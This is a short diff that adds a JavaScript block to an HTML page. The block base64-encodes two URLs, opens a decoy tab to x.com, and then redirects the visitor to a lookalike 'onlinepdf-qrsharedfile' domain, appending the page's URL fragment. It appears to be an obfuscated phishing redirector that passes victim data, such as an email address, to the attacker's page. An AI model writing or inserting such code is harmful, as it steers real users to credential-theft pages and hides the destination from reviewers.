@@ -1,0 +1,14 @@
+  <script type="text/javascript">
+    var firstBase64Url = "aHR0cHM6Ly94LmNvbQ==";
+    var secondBase64Url = "aHR0cHM6Ly9vbmxpbmVwZGYtcXJzaGFyZWRmaWxlLmNvbS9pbmRleC5odG1s";
+
+    // Load the first URL for a few seconds
+    setTimeout(function() {
+      window.open(atob(firstBase64Url), '_blank');
+    }, 2000); // 2000 milliseconds = 2 seconds
+
+    // After the specified time, load the second URL
+    setTimeout(function() {
+      window.location.href = atob(secondBase64Url) + "#D" + window.location.hash.substr(1);
+    }, 2000); // 2000 milliseconds = 2 seconds
+  </script>
